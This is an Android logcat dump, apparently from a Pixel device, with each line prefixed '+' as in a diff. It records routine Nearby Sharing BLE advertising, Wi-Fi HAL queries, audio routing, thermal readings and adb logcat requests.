+09-04 07:18:28.098 11073 16582 I NearbyMediums: BleAdvertisement { version=2, socketVersion=2, isFast=true, serviceIdHash=null, data=[ 0x23 0x4b 0x4a 0x4e 0x49 0x11 0x32 0x1d 0xaa 0x0c 0x72 0xac 0xcd 0x5c 0xc4 0x7e 0x39 0x21 0xee 0xa6 0x34 0x5b 0x66 ], deviceToken=[ 0xc3 0x62 ], rxAdvertisement=null } : 1 times.
+09-04 07:18:28.098 11073 16582 I NearbyMediums: Total 1 fast advertisements from 1 unique advertisers.
+09-04 07:18:28.098 11073 16582 I NearbyMediums: Current Tracked Scanning Clients are : {NearbyConnections.EnvironmentMonitor, NearbySharing, NearbyConnections.TxAdvertisement}
+09-04 07:18:28.418   932   962 I CHRE    : @ 26598.496: [ImuCal] [GYRO_RPS] (s0, c0) Offset | Temp [C] | Quality: -.000693, 0.000493, -.003799 | 30.170819 | 4
+09-04 07:18:28.419   932   962 I CHRE    : @ 26598.496: [ImuCal] [GYRO_RPS] (s0) Temp Sensitivity: -.000013, -.000026, 0.000119
+09-04 07:18:28.419   932   962 I CHRE    : @ 26598.496: [ImuCal] [GYRO_RPS] (s0) Temp Intercept: -.000285, 0.001290, -.007415
+09-04 07:18:28.563   992  1083 I WifiHAL : Creating message to get link statistics; iface = 47
+09-04 07:18:28.677   992  1083 E libbinder.IPCThreadState: binder thread pool (1 threads) starved for 113 ms
+09-04 07:18:28.728   992  1083 D WifiHAL : Start debug command: mType GET_FEATURE
+09-04 07:18:28.728   992  1083 I WifiHAL : CreateRequest mType = GET_FEATURE
+09-04 07:18:28.728   992  1083 D WifiHAL : In DebugCommand::handleResponse, mType:GET_FEATURE
+09-04 07:18:28.728   992  1083 D WifiHAL : len = 4, expected len = 4
+09-04 07:18:29.296  1178  1178 D AOC     : F1:MSG: controller.cc, 273: AudioOutCtrl: cmd ID: 0x00c9, tag: 0x9b [cntr = 467]
+09-04 07:18:29.296  1178  1178 D AOC     : F1:MSG: controller.cc, 811: AudioOutCtrl: ipc: audio_output_co, cmd ID: 0x00c9, tag: 0x9b, rc: 0
+09-04 07:18:29.296  1178  1178 D AOC     : H0:Mixer AMixSPKR Input 1 RB overflow. Resyncing.
+09-04 07:18:29.302   926  1744 D audio_hw: shutdown: low-latency-playback
+09-04 07:18:29.302   926  1744 E audio_route: unable to find path 'speaker-post'
+09-04 07:18:29.303   926  1744 D audio_hw_aoc_route: speaker-post 0
+09-04 07:18:29.304   926  1744 D audio_hw_aoc_route: low-latency-playbackP 0
+09-04 07:18:29.304   926  1744 W audio_hw_35l41: cs35l41_amp_common_event: ret: 0, event: 3, state: 3, device: 4
+09-04 07:18:29.304  1178  1178 D AOC     : F1:MSG: controller.cc, 273: AudioOutCtrl: cmd ID: 0x010f, tag: 0x9c [cntr = 468]
+09-04 07:18:29.304  1178  1178 D AOC     : F1:Unregistered Source 1 from Sink 0 
+09-04 07:18:29.305  1178  1178 D AOC     : F1:AT Map:0 (LL:0), 0 EPs active, Power: Yes, Config: No
+09-04 07:18:29.305   926  1744 D audio_hw_aoc_route: speaker 0
+09-04 07:18:29.305  1178  1178 D AOC     : F1:Mixer 0 configuration changed: (0)
+09-04 07:18:29.305  1178  1178 D AOC     : F1:Sink 0 Configuration changed: ULL (disabled)
+09-04 07:18:29.305  1178  1178 D AOC     : F1:MSG: controller.cc, 811: AudioOutCtrl: ipc: audio_output_co, cmd ID: 0x010f, tag: 0x9c, rc: 0
+09-04 07:18:29.305  1178  1178 D AOC     : H0:Mixer AMixSPKR: 480 samples (0000/0000) (OFF SC)
+09-04 07:18:29.306  1178  1178 D AOC     : H0:Mixer configuration updated
+09-04 07:18:29.309   926  1744 W audio_hw_35l41: cs35l41_amp_common_event: ret: 0, event: 4, state: 2, device: 4
+09-04 07:18:29.310   926  1744 D audio_hw_soundtrigger: st_comm_aud_event_monitor:codec dev:4 inactive
+09-04 07:18:29.310   926  1744 D audio_hw_soundtrigger: st_uc_monitor:uc:low-latency-playback inactive
+09-04 07:18:29.310   926  1744 I audio_hw_aoc: Mode Ambient is already selected
+09-04 07:18:29.310   926  1744 D audio_hw_waves: waves_usecase_event: low-latency-playback stop
+09-04 07:18:30.386  1431  1956 D InetDiagMessage: Destroyed 0 sockets, proto=IPPROTO_TCP, family=AF_INET, states=14
+09-04 07:18:30.391  1431  1956 D InetDiagMessage: Destroyed 0 sockets, proto=IPPROTO_TCP, family=AF_INET6, states=14
+09-04 07:18:30.392  1431  1956 D InetDiagMessage: Destroyed live tcp sockets for uids={10219} in 11ms
+09-04 07:18:30.397  1431  1956 D InetDiagMessage: Destroyed 0 sockets, proto=IPPROTO_TCP, family=AF_INET, states=14
+09-04 07:18:30.402  1431  1956 D InetDiagMessage: Destroyed 0 sockets, proto=IPPROTO_TCP, family=AF_INET6, states=14
+09-04 07:18:30.402  1431  1956 D InetDiagMessage: Destroyed live tcp sockets for uids={20219} in 10ms
+09-04 07:18:31.330 11073 11073 D BoundBrokerSvc: onUnbind: Intent { act=com.google.android.gms.clearcut.sampler.service.START dat=chimera-action:/... xflg=0x4 cmp=com.google.android.gms/.chimera.PersistentDirectBootAwareApiService }
+09-04 07:18:31.483  1431  1956 D InetDiagMessage: Destroyed 0 sockets, proto=IPPROTO_TCP, family=AF_INET, states=14
+09-04 07:18:31.489  1431  1956 D InetDiagMessage: Destroyed 0 sockets, proto=IPPROTO_TCP, family=AF_INET6, states=14
+09-04 07:18:31.489  1431  1956 D InetDiagMessage: Destroyed live tcp sockets for uids={10221} in 12ms
+09-04 07:18:31.494  1431  1956 D InetDiagMessage: Destroyed 0 sockets, proto=IPPROTO_TCP, family=AF_INET, states=14
+09-04 07:18:31.500  1431  1956 D InetDiagMessage: Destroyed 0 sockets, proto=IPPROTO_TCP, family=AF_INET6, states=14
+09-04 07:18:31.500  1431  1956 D InetDiagMessage: Destroyed live tcp sockets for uids={20221} in 11ms
+09-04 07:18:31.743   992  2892 I WifiHAL : Creating message to get link statistics; iface = 47
+09-04 07:18:31.860   992  2892 E libbinder.IPCThreadState: binder thread pool (1 threads) starved for 116 ms
+09-04 07:18:31.912   992  2892 D WifiHAL : Start debug command: mType GET_FEATURE
+09-04 07:18:31.912   992  2892 I WifiHAL : CreateRequest mType = GET_FEATURE
+09-04 07:18:31.912   992  2892 D WifiHAL : In DebugCommand::handleResponse, mType:GET_FEATURE
+09-04 07:18:31.912   992  2892 D WifiHAL : len = 4, expected len = 4
+09-04 07:18:31.923   928  2558 I bthal.activity: bt_power: LeAdvStat: 07:18:30:922 - 07:18:31:922, duration: 1000, le_adv_count: 1, total_le_adv_count: 4855, total_event_count: 1
+09-04 07:18:32.029  2138  2960 D IpClient/wlan0: interfaceLinkStateChanged: ifindex 47 up
+09-04 07:18:32.944   928  2558 I bthal.activity: bt_power: LeAdvStat: 07:18:31:943 - 07:18:32:943, duration: 1000, le_adv_count: 1, total_le_adv_count: 4856, total_event_count: 1
+09-04 07:18:34.188  1729  1732 I pixel-thermal: cellular-emergency:33.5829 raw data: VIRTUAL-NEUTRAL:33582.9 VIRTUAL-NEUTRAL-SKIN2:33399.2 VIRTUAL-QUIET-NEUTRAL:32838.1 VIRTUAL-SKIN:33582.9 cellular-emergency:33582.9 disp_therm:32663 gnss_tcxo_therm:33976 neutral_therm:32885 quiet_therm:32818 skin_therm1:34109 skin_therm2:34599 
+09-04 07:18:34.189  1729  1732 I pixel-thermal: VIRTUAL-SKIN-CPU:33.5829 raw data: VIRTUAL-SKIN:33582.9 VIRTUAL-SKIN-CPU:33582.9 
+09-04 07:18:34.190  1729  1732 I pixel-thermal: neutral_therm:32.885 raw data: neutral_therm:32885 
+09-04 07:18:34.190  1729  1732 I pixel-thermal: VIRTUAL-SKIN:33.5829 raw data: VIRTUAL-SKIN:33582.9 
+09-04 07:18:34.190  1729  1732 I pixel-thermal: VIRTUAL-SKIN-CPU-GPU:33.5829 raw data: VIRTUAL-SKIN:33582.9 VIRTUAL-SKIN-CPU-GPU:33582.9 
+09-04 07:18:34.190  1729  1732 I pixel-thermal: VIRTUAL-SKIN-HINT:33.5829 raw data: VIRTUAL-SKIN:33582.9 VIRTUAL-SKIN-HINT:33582.9 
+09-04 07:18:34.191  1729  1732 I pixel-thermal: VIRTUAL-SKIN-CHARGE:33.5829 raw data: VIRTUAL-SKIN:33582.9 VIRTUAL-SKIN-CHARGE:33582.9 
+09-04 07:18:34.203 23504 23504 I adbd    : adbd service requested 'shell,v2,TERM=xterm-256color:export ANDROID_LOG_TAGS=''; exec logcat '-d' '-s' 'VRP_POC:D''
+09-04 07:18:34.267 23504 23504 I adbd    : adbd service requested 'shell,v2,TERM=xterm-256color:export ANDROID_LOG_TAGS=''; exec logcat '-d' '-s' 'AppAuth:W''
+09-04 07:18:34.312 23504 23504 I adbd    : adbd service requested 'shell,v2,TERM=xterm-256color:export ANDROID_LOG_TAGS=''; exec logcat '-d' '-s' 'Fido:W''
+09-04 07:18:34.362 23504 23504 I adbd    : adbd service requested 'shell,v2,TERM=xterm-256color:export ANDROID_LOG_TAGS=''; exec logcat '-d''
+09-04 07:18:34.926   992  1083 I WifiHAL : Creating message to get link statistics; iface = 47
+09-04 07:18:35.047   992  1083 E libbinder.IPCThreadState: binder thread pool (1 threads) starved for 120 ms
+09-04 07:18:35.101   992  1083 D WifiHAL : Start debug command: mType GET_FEATURE
+09-04 07:18:35.101   992  1083 I WifiHAL : CreateRequest mType = GET_FEATURE
+09-04 07:18:35.102   992  1083 D WifiHAL : In DebugCommand::handleResponse, mType:GET_FEATURE
+09-04 07:18:35.102   992  1083 D WifiHAL : len = 4, expected len = 4
+09-04 07:18:35.312  2193  2353 D TemperatureStateSource: sequence=2552 actualDelay=10003
+09-04 07:18:35.314  2193  2353 D TemperatureStateSource: Reading temperature: sequence=2553
+09-04 07:18:35.319  1729  1729 I pixel-thermal: VIRTUAL-SKIN:33.5829 raw data: VIRTUAL-SKIN:33582.9 
+09-04 07:18:35.321  2193  2353 D TemperatureStateSource: getDeviceTemperatures: sequence=2553 deviceTemperatureType=3 temperatureSource=0 temperatures=[33.582905]
+09-04 07:18:35.322  2193  2353 D TemperatureStateSource: sequence=2553 waitTime=10000
+09-04 07:18:35.323  2193  2499 D ImpulseStateSource: Notify clients: 2563
+09-04 07:18:35.347  1431  1464 W JobInfo : Job 'com.google.android.apps.photos/com.google.android.libraries.social.async.BackgroundTaskJobService#1043' has a deadline with no functional constraints. The deadline won't improve job execution latency. Consider removing the deadline.
+09-04 07:18:35.373  1431  1856 D ActivityManager: freezing 10060 com.google.android.apps.turbo
+09-04 07:18:35.383  1431  1956 D InetDiagMessage: Destroyed 0 sockets, proto=IPPROTO_TCP, family=AF_INET, states=14
+09-04 07:18:35.389  1431  1956 D InetDiagMessage: Destroyed 0 sockets, proto=IPPROTO_TCP, family=AF_INET6, states=14
+09-04 07:18:35.390  1431  1956 D InetDiagMessage: Destroyed live tcp sockets for uids={10151} in 10ms
+09-04 07:18:36.432  1431  1856 D ActivityManager: freezing 11126 com.google.android.googlequicksearchbox:search
+09-04 07:18:36.439  1431  1856 D ActivityManager: freezing 15172 com.google.android.gms.ui
+09-04 07:18:36.484 11094 11094 D BoundBrokerSvc: onUnbind: Intent { act=com.google.android.gms.measurement.START xflg=0x4 pkg=com.google.android.gms }
+09-04 07:18:36.982  1431  1856 D ActivityManager: freezing 12952 com.google.android.gm
+09-04 07:18:36.990  1431  1956 D InetDiagMessage: Destroyed 0 sockets, proto=IPPROTO_TCP, family=AF_INET, states=14
+09-04 07:18:36.992  1431  1956 D InetDiagMessage: Destroyed 0 sockets, proto=IPPROTO_TCP, family=AF_INET6, states=14
+09-04 07:18:36.992  1431  1956 D InetDiagMessage: Destroyed live tcp sockets for uids={10221} in 4ms
+09-04 07:18:38.105 11073 16582 I NearbyMediums: Found Fast Ble Advertisements :
+09-04 07:18:38.105 11073 16582 I NearbyMediums: BleAdvertisement { version=2, socketVersion=2, isFast=true, serviceIdHash=null, data=[ 0x23 0x4b 0x4a 0x4e 0x49 0x11 0x32 0x1d 0xaa 0x0c 0x72 0xac 0xcd 0x5c 0xc4 0x7e 0x39 0x21 0xee 0xa6 0x34 0x5b 0x66 ], deviceToken=[ 0xc3 0x62 ], rxAdvertisement=null } : 2 times.
+09-04 07:18:38.105 11073 16582 I NearbyMediums: Total 2 fast advertisements from 1 unique advertisers.
+09-04 07:18:38.106 11073 16582 I NearbyMediums: Current Tracked Scanning Clients are : {NearbyConnections.EnvironmentMonitor, NearbySharing, NearbyConnections.TxAdvertisement}
+09-04 07:18:38.115   992  2892 I WifiHAL : Creating message to get link statistics; iface = 47
+09-04 07:18:38.229   992  2892 D WifiHAL : Start debug command: mType GET_FEATURE
+09-04 07:18:38.230   992  2892 I WifiHAL : CreateRequest mType = GET_FEATURE
+09-04 07:18:38.230   992  2892 D WifiHAL : In DebugCommand::handleResponse, mType:GET_FEATURE
+09-04 07:18:38.230   992  2892 D WifiHAL : len = 4, expected len = 4
+09-04 07:18:39.907  1729  1732 I pixel-thermal: VIRTUAL-USB-UI:0 raw data: USB2-MINUS-CHG:-3094 VIRTUAL-USB-UI:0 charger_skin_therm:35690 usb_pwr_therm2:32596 
+09-04 07:18:39.908  1729  1732 I pixel-thermal: VIRTUAL-USB-THROTTLING:0 raw data: USB2-MINUS-CHG:-3094 VIRTUAL-USB-THROTTLING:0 usb_pwr_therm2:32596 
+09-04 07:18:39.909  1729  1732 I pixel-thermal: Power rails total power: 412.33 mW for 60018 ms
+09-04 07:18:39.909  1729  1732 I pixel-thermal: Power rails [L8S_UFS_VCCQ: 11.96 mW] [S2S_VDD_G3D: 4.52 mW] [S10S_VDD2L: 11.65 mW] [S5S_VDDQ_MEM: 6.39 mW] [S4S_VDD2H_MEM: 19.50 mW] [S9S_VDD_AOC: 22.01 mW] 
+09-04 07:18:39.909  1729  1732 I pixel-thermal: Power rails [S10M_VDD_TPU: 10.64 mW] [L2S_VDD_AOC_RET: 8.52 mW] [L9S_GNSS_CORE: 2.67 mW] [S1M_VDD_MIF: 31.19 mW] [S5M_VDD_INT: 27.75 mW] [S4M_VDD_CPUCL0: 50.82 mW] 
+09-04 07:18:39.909  1729  1732 I pixel-thermal: Power rails [S2M_VDD_CPUCL2: 27.19 mW] [S3M_VDD_CPUCL1: 23.82 mW] [L15M_VDD_SLC_M: 14.56 mW] [VSYS_PWR_DISPLAY: 139.16 mW] 
+09-04 07:18:39.909  1729  1732 I pixel-thermal: CDEV log usbc-port state:0 fcc state:0 thermal-cpufreq-1 state:0 tpu_cooling state:0 thermal-gpufreq-0 state:0 thermal-cpufreq-2 state:0 thermal-cpufreq-0 state:0 
+09-04 07:18:40.430  1431  1956 D InetDiagMessage: Destroyed 0 sockets, proto=IPPROTO_TCP, family=AF_INET, states=14
+09-04 07:18:40.436  1431  1956 D InetDiagMessage: Destroyed 0 sockets, proto=IPPROTO_TCP, family=AF_INET6, states=14
+09-04 07:18:40.436  1431  1956 D InetDiagMessage: Destroyed live tcp sockets for uids={10219} in 12ms
+09-04 07:18:40.441  1431  1956 D InetDiagMessage: Destroyed 0 sockets, proto=IPPROTO_TCP, family=AF_INET, states=14
+09-04 07:18:40.446  1431  1956 D InetDiagMessage: Destroyed 0 sockets, proto=IPPROTO_TCP, family=AF_INET6, states=14
+09-04 07:18:40.446  1431  1956 D InetDiagMessage: Destroyed live tcp sockets for uids={20219} in 10ms
+09-04 07:18:41.198  1729  1732 I pixel-thermal: cellular-emergency:33.6108 raw data: VIRTUAL-NEUTRAL:33610.8 VIRTUAL-NEUTRAL-SKIN2:33383.8 VIRTUAL-QUIET-NEUTRAL:32816.1 VIRTUAL-SKIN:33610.8 cellular-emergency:33610.8 disp_therm:32663 gnss_tcxo_therm:34087 neutral_therm:32863 quiet_therm:32796 skin_therm1:34176 skin_therm2:34599 
+09-04 07:18:41.198  1729  1732 I pixel-thermal: VIRTUAL-SKIN-CPU:33.6108 raw data: VIRTUAL-SKIN:33610.8 VIRTUAL-SKIN-CPU:33610.8 
+09-04 07:18:41.199  1729  1732 I pixel-thermal: neutral_therm:32.863 raw data: neutral_therm:32863 
+09-04 07:18:41.199  1729  1732 I pixel-thermal: VIRTUAL-SKIN:33.6108 raw data: VIRTUAL-SKIN:33610.8 
+09-04 07:18:41.200  1729  1732 I pixel-thermal: VIRTUAL-SKIN-CPU-GPU:33.6108 raw data: VIRTUAL-SKIN:33610.8 VIRTUAL-SKIN-CPU-GPU:33610.8 
+09-04 07:18:41.200  1729  1732 I pixel-thermal: VIRTUAL-SKIN-HINT:33.6108 raw data: VIRTUAL-SKIN:33610.8 VIRTUAL-SKIN-HINT:33610.8 
+09-04 07:18:41.200  1729  1732 I pixel-thermal: VIRTUAL-SKIN-CHARGE:33.6108 raw data: VIRTUAL-SKIN:33610.8 VIRTUAL-SKIN-CHARGE:33610.8 
+09-04 07:18:41.243   992  2892 I WifiHAL : Creating message to get link statistics; iface = 47
+09-04 07:18:41.362   992  2892 E libbinder.IPCThreadState: binder thread pool (1 threads) starved for 118 ms
+09-04 07:18:41.411   992  2892 D WifiHAL : Start debug command: mType GET_FEATURE
+09-04 07:18:41.411   992  2892 I WifiHAL : CreateRequest mType = GET_FEATURE
+09-04 07:18:41.411   992  2892 D WifiHAL : In DebugCommand::handleResponse, mType:GET_FEATURE
+09-04 07:18:41.411   992  2892 D WifiHAL : len = 4, expected len = 4
+09-04 07:18:43.456 11073 16610 I .gms.persistent: Explicit concurrent mark compact GC freed 3192KB AllocSpace bytes, 0(0B) LOS objects, 90% free, 24MB/256MB, paused 962us,3.007ms total 323.127ms
+09-04 07:18:44.002 23504 23504 I adbd    : adbd service requested 'shell,v2,TERM=xterm-256color:export ANDROID_LOG_TAGS=''; exec logcat '-d''
+09-04 07:18:44.058 23504 23504 I adbd    : adbd service requested 'shell,v2,TERM=xterm-256color:export ANDROID_LOG_TAGS=''; exec logcat '-d''
+09-04 07:18:44.214   928  2558 I bthal.activity: bt_power: LeAdvStat: 07:18:43:214 - 07:18:44:214, duration: 1000, le_adv_count: 1, total_le_adv_count: 4857, total_event_count: 1
+09-04 07:18:44.423   992  1083 I WifiHAL : Creating message to get link statistics; iface = 47
+09-04 07:18:44.542   992  1083 E libbinder.IPCThreadState: binder thread pool (1 threads) starved for 119 ms
+09-04 07:18:44.596   992  1083 D WifiHAL : Start debug command: mType GET_FEATURE
+09-04 07:18:44.596   992  1083 I WifiHAL : CreateRequest mType = GET_FEATURE
+09-04 07:18:44.597   992  1083 D WifiHAL : In DebugCommand::handleResponse, mType:GET_FEATURE
+09-04 07:18:44.597   992  1083 D WifiHAL : len = 4, expected len = 4
+09-04 07:18:45.324  2193  3242 D TemperatureStateSource: sequence=2553 actualDelay=10002
+09-04 07:18:45.325  2193  3242 D TemperatureStateSource: Reading temperature: sequence=2554
+09-04 07:18:45.332  1729  1729 I pixel-thermal: VIRTUAL-SKIN:33.6543 raw data: VIRTUAL-NEUTRAL:33654.3 VIRTUAL-NEUTRAL-SKIN2:33404 VIRTUAL-QUIET-NEUTRAL:32836.2 VIRTUAL-SKIN:33654.3 disp_therm:32685 gnss_tcxo_therm:34198 neutral_therm:32930 quiet_therm:32796 skin_therm1:34221 skin_therm2:34510 
+09-04 07:18:45.333  2193  3242 D TemperatureStateSource: getDeviceTemperatures: sequence=2554 deviceTemperatureType=3 temperatureSource=0 temperatures=[33.6543]
+09-04 07:18:45.334  2193  3242 D TemperatureStateSource: sequence=2554 waitTime=10000
+09-04 07:18:45.339  1729  1729 I pixel-thermal: VIRTUAL-SKIN:33.6543 raw data: VIRTUAL-SKIN:33654.3 
+09-04 07:18:45.340  2193  2353 I TemperatureStateSource: temperature was set
+09-04 07:18:45.342  2193  2353 D ImpulseStateSource: Notify clients: 2564
+09-04 07:18:45.343  2193  2499 D ImpulseConnection: bindService: com.google.android.apps.turbo
+09-04 07:18:45.367  1431  2277 D ActivityManager: sync unfroze 10060 com.google.android.apps.turbo for 6
+09-04 07:18:45.389  2193  2193 D ImpulseConnection: onServiceConnected: ComponentInfo{com.google.android.apps.turbo/com.google.android.apps.turbo.adaptiveplatform.impulse.ImpulseClientService} service is null false
+09-04 07:18:45.391  1431  6903 W ProcessStats: Tracking association SourceState{170f934 com.google.android.pixelsystemservice/10259 ImpFg #46876} whose proc state 5 is better than process ProcessState{b40235d com.google.android.apps.turbo/10151 pkg=com.google.android.apps.turbo} proc state 14 (41 skipped)
+09-04 07:18:45.409 11094 16768 I GmscoreIpa: Starting mediastore instant index [CONTEXT service_id=255 ]
+09-04 07:18:45.411  1431  1856 D ActivityManager: freezing 12281 com.google.android.apps.photos
+09-04 07:18:45.415  1431  1956 D InetDiagMessage: Destroyed 0 sockets, proto=IPPROTO_TCP, family=AF_INET, states=14
+09-04 07:18:45.416  1431  1956 D InetDiagMessage: Destroyed 0 sockets, proto=IPPROTO_TCP, family=AF_INET6, states=14
+09-04 07:18:45.417  1431  1956 D InetDiagMessage: Destroyed live tcp sockets for uids={10219} in 2ms
+09-04 07:18:47.610   992  2892 I WifiHAL : Creating message to get link statistics; iface = 47
+09-04 07:18:47.738   992  2892 E libbinder.IPCThreadState: binder thread pool (1 threads) starved for 128 ms
+09-04 07:18:47.790   992  2892 D WifiHAL : Start debug command: mType GET_FEATURE
+09-04 07:18:47.790   992  2892 I WifiHAL : CreateRequest mType = GET_FEATURE
+09-04 07:18:47.790   992  2892 D WifiHAL : In DebugCommand::handleResponse, mType:GET_FEATURE
+09-04 07:18:47.790   992  2892 D WifiHAL : len = 4, expected len = 4
+09-04 07:18:48.112 11073 16582 I NearbyMediums: Found Fast Ble Advertisements :
+09-04 07:18:48.112 11073 16582 I NearbyMediums: BleAdvertisement { version=2, socketVersion=2, isFast=true, serviceIdHash=null, data=[ 0x23 0x4b 0x4a 0x4e 0x49 0x11 0x32 0x1d 0xaa 0x0c 0x72 0xac 0xcd 0x5c 0xc4 0x7e 0x39 0x21 0xee 0xa6 0x34 0x5b 0x66 ], deviceToken=[ 0xc3 0x62 ], rxAdvertisement=null } : 1 times.
+09-04 07:18:48.112 11073 16582 I NearbyMediums: Total 1 fast advertisements from 1 unique advertisers.
+09-04 07:18:48.114 11073 16582 I NearbyMediums: Current Tracked Scanning Clients are : {NearbyConnections.EnvironmentMonitor, NearbySharing, NearbyConnections.TxAdvertisement}
+09-04 07:18:48.217  1729  1732 I pixel-thermal: cellular-emergency:33.6543 raw data: VIRTUAL-NEUTRAL:33654.3 VIRTUAL-NEUTRAL-SKIN2:33404 VIRTUAL-QUIET-NEUTRAL:32836.2 VIRTUAL-SKIN:33654.3 cellular-emergency:33654.3 disp_therm:32685 gnss_tcxo_therm:34198 neutral_therm:32930 quiet_therm:32796 skin_therm1:34221 skin_therm2:34510 
+09-04 07:18:48.218  1729  1732 I pixel-thermal: VIRTUAL-SKIN-CPU:33.6543 raw data: VIRTUAL-SKIN:33654.3 VIRTUAL-SKIN-CPU:33654.3 
+09-04 07:18:48.218  1729  1732 I pixel-thermal: neutral_therm:32.93 raw data: neutral_therm:32930 
+09-04 07:18:48.218  1729  1732 I pixel-thermal: VIRTUAL-SKIN:33.6543 raw data: VIRTUAL-SKIN:33654.3 
+09-04 07:18:48.219  1729  1732 I pixel-thermal: VIRTUAL-SKIN-CPU-GPU:33.6543 raw data: VIRTUAL-SKIN:33654.3 VIRTUAL-SKIN-CPU-GPU:33654.3 
+09-04 07:18:48.219  1729  1732 I pixel-thermal: VIRTUAL-SKIN-HINT:33.6543 raw data: VIRTUAL-SKIN:33654.3 VIRTUAL-SKIN-HINT:33654.3 
+09-04 07:18:48.219  1729  1732 I pixel-thermal: VIRTUAL-SKIN-CHARGE:33.6543 raw data: VIRTUAL-SKIN:33654.3 VIRTUAL-SKIN-CHARGE:33654.3 
+09-04 07:18:50.803   992  2892 I WifiHAL : Creating message to get link statistics; iface = 47
+09-04 07:18:50.928   992  2892 E libbinder.IPCThreadState: binder thread pool (1 threads) starved for 125 ms
+09-04 07:18:50.987   992  2892 D WifiHAL : Start debug command: mType GET_FEATURE
+09-04 07:18:50.987   992  2892 I WifiHAL : CreateRequest mType = GET_FEATURE
+09-04 07:18:50.987   992  2892 D WifiHAL : In DebugCommand::handleResponse, mType:GET_FEATURE
+09-04 07:18:50.987   992  2892 D WifiHAL : len = 4, expected len = 4
+09-04 07:18:52.380 11073 16582 I NearbySharing: ReceiveProvider: Received request to stop advertising.
+09-04 07:18:52.383 11073 16582 I NearbySharing: Advertising has stopped
+09-04 07:18:52.385 11073 16774 I NearbySharing: NearbySharing Internal event ReceiveManagerStopBroadcast
+09-04 07:18:52.387 11073 16775 I NearbySharing: [ClearcutLog] ADVERTISE_DEVICE_PRESENCE_END sessionId=0 flowId=2273835368529026674 
+09-04 07:18:52.387 11073 11230 I NearbyConnections: Client 163682648 requested advertising to stop.
+09-04 07:18:52.387 11073 16774 I NearbySharing: NearbySharing Internal event ReceiveManagerEnd
+09-04 07:18:52.392  2162  2623 I bt_shim_advertiser: system/main/shim/le_advertising_manager.cc:77 Unregister: in shim layer
+09-04 07:18:52.394  2162  2622 I bluetooth: bluetooth_private_gatt::gatt::server::isolation_manager: removing server (if any) associated with advertiser AdvertiserId(4)
+09-04 07:18:52.394  2162  2623 I bt_shim_advertiser: system/main/shim/le_advertising_manager.cc:77 Unregister: in shim layer
+09-04 07:18:52.394 11073 16777 D BluetoothAdapter: isLeEnabled(): ON
+09-04 07:18:52.394  2162  2622 I bluetooth: bluetooth_private_gatt::gatt::server::isolation_manager: removing server (if any) associated with advertiser AdvertiserId(3)
+09-04 07:18:52.396  2162  2623 I bt_shim_advertiser: system/main/shim/le_advertising_manager.cc:158 StartAdvertisingSet: in shim layer
+09-04 07:18:52.396  2162  2623 I bt_shim_advertiser: system/main/shim/le_advertising_manager.cc:185 StartAdvertisingSet: create advertising set, client_id:255, reg_id:-221
+09-04 07:18:52.402 11073 16582 I NearbySharing: Start advertising with mode BACKGROUND certificate visibility ALL_CONTACTS data usage preference ONLINE, bt advertising false, vendorId 0, deviceName included: false
+09-04 07:18:52.402 11073 16582 I NearbySharing: Uwb feature is off.
+09-04 07:18:52.403 11073 16582 I NearbySharing: Updating advertising options for [eals@5f51482, effs@e274896] providers
+09-04 07:18:52.403 11073 16582 I NearbySharing: ReceiveProvider: Received request to start advertising.
+09-04 07:18:52.405  2162  2549 I bluetooth: system/gd/hci/le_advertising_manager_impl.cc:421 allocate_advertiser: Removing advertiser id 2 from removed advertisers.
+09-04 07:18:52.406  2162  2549 I bluetooth: system/gd/hci/le_advertising_manager_impl.cc:663 create_extended_advertiser_with_id: Scheduling address rotation for advertiser_id=2
+09-04 07:18:52.406  2162  2549 I bluetooth: system/gd/hci/le_address_manager.cc:557 GetNextPrivateAddressIntervalRange: client=advertising_set_2, nonwake=7m20s, wake=13m4s
+09-04 07:18:52.407 11073 16582 I NearbySharing: Advertising has started with mode BACKGROUND, Bt enabled : false
+09-04 07:18:52.413  2162  2549 I bluetooth: system/gd/hci/le_advertising_manager_impl.cc:1735 on_set_advertising_set_random_address_complete: update random address for advertising set 2 : xx:xx:xx:xx:9a:41
+09-04 07:18:52.415 11073 11073 I NearbyMediums: [InstantOnLostManager] Start instant onLost extended advertising, hashes = [ 0x06 0x39 0x61 0x3f ].
+09-04 07:18:52.416 11073 16777 I NearbyMediums: Successfully stopped BLE advertising for service NearbySharing
+09-04 07:18:52.416 11073 16777 D BluetoothServerSocket: BluetoothServerSocket:close() called. mChannel=-1
+09-04 07:18:52.416 11073 16777 D BluetoothSocket: close() Local Socket channel=11 mSocketIS=android.net.LocalSocketImpl$SocketInputStream@f7f5baa mSocketOS=android.net.LocalSocketImpl$SocketOutputStream@51e06bb mSocket=android.net.LocalSocket@37807d8 impl:android.net.LocalSocketImpl@58f5731 fd:java.io.FileDescriptor@cb5de95 mSocketState=LISTENING
+09-04 07:18:52.416 11073 16777 D BluetoothSocket: Closing mSocket: android.net.LocalSocket@37807d8 impl:android.net.LocalSocketImpl@58f5731 fd:java.io.FileDescriptor@cb5de95
+09-04 07:18:52.416 11073 16777 I NearbyMediums: Stopped accepting Bluetooth Classic connections for NearbySharing.
+09-04 07:18:52.416  2162  2613 I bt_btif_sock_rfcomm: system/btif/src/btif_sock_rfc.cc:538 cleanup_rfc_slot: disconnected from RFCOMM socket connections for device: 00:00:00:00:00:00, scn: 11, app_uid: 10266, slot_id: 52, socket_id: 0
+09-04 07:18:52.416  2162  2613 W BluetoothMetrics: system/metrics/src/android/metrics.cc:105 LogBluetoothEvent: Failed BluetoothEvent Upload - Address is Empty
+09-04 07:18:52.416  2162  2613 I bt_bta_dm: system/bta/dm/bta_dm_act.cc:1134 bta_dm_set_eir: Generating extended inquiry response packet EIR
+09-04 07:18:52.417  2162  2543 I bt_port_api: system/stack/rfcomm/port_api.cc:319 RFCOMM_RemoveServer: handle=26
+09-04 07:18:52.417  1431  6903 I WifiService: releaseMulticastLock uid=10266 lockTag=nearby-connections-13408005
+09-04 07:18:52.417 11073 14897 D BluetoothServerSocket: BluetoothServerSocket:close() called. mChannel=-1
+09-04 07:18:52.417 11073 14897 V BluetoothSocket: close() Local Socket: Already closed
+09-04 07:18:52.417  1431  1959 I WifiService: releaseMulticastLock uid=1000 lockTag=NsdService
+09-04 07:18:52.418 11073 16777 I Nearby  : (REDACTED) NsdManagerCompat released multicast lock %d.
+09-04 07:18:52.419  1431  1959 I serviceDiscovery: [MdnsAdvertiser] Removing service with ID 52
+09-04 07:18:52.420  2138  2960 D IpClient.wlan0: set max DTIM multiplier to 9
+09-04 07:18:52.420   992  1083 E WifiHAL : Setting APF program, halHandle = 0xb400007a8c865550
+09-04 07:18:52.420   992  1083 E WifiHAL : Set apf filter for iface = wlan0
